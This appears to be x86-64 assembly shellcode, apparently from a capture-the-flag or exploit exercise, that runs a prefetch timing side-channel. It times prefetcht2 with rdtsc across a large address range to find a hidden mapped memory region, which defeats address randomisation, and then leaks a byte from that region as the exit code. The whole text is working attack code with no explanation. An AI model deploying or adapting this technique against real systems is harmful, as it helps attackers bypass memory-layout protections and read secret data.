.intel_syntax noprefix
.global _start
_start:
	//mov r14, 0x1e1e1d0000
	mov r14, 0x2000000000
	mov r11, 0x9000000000
_branch:
	mov rbx, 0x10000
	add r14, rbx
	mov r15, 0
        mov r12, 0
_sub_branch:
	xor rax, rax
	xor rdx, rdx

	rdtsc
	shl rdx, 32
	or rax, rdx
	mov r9, rax
	lfence
	prefetcht2 BYTE PTR [r14]
	lfence
	rdtsc

	shl rdx, 32
	or rax, rdx
	mov r10, rax

	sub r10, r9
        add r12,1
        add r15,r10
        cmp r12,20
        jle _sub_branch
        mov rax, r15
        xor rdx, rdx
        mov rcx, 20
        div rcx
	
	cmp rax, 80
	jle _found_it
	cmp r14, r11
	jl _branch 	

_found_it:
	xor rdi, rdi
	mov al, BYTE PTR [r14+1]
	mov dil, al
	mov rax, 0X3C
	syscall
